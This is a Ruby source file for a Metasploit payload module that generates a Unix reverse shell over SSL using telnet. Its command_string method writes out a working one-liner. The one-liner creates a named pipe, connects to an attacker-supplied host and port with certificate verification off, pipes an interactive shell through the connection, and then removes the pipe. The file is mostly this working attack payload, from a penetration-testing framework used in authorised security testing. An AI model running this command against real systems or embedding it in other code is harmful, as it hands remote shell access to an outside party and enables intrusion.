##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Reverse TCP SSL (telnet)',
        'Description' => %q{
          Creates an interactive shell via mkfifo and telnet.
          This method works on Debian and other systems compiled
          without /dev/tcp support. This module uses the '-z'
          option included on some systems to encrypt using SSL.
        },
        'Author' => 'RageLtMan <rageltman[at]sempervictus>',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcpSsl,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'telnet',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_advanced_options(
      [
        OptString.new('TelnetPath', [true, 'The path to the telnet executable', 'telnet'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    pipe_name = Rex::Text.rand_text_alpha(8..11)
    "mkfifo #{pipe_name} && #{datastore['TelnetPath']} -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
  end
end
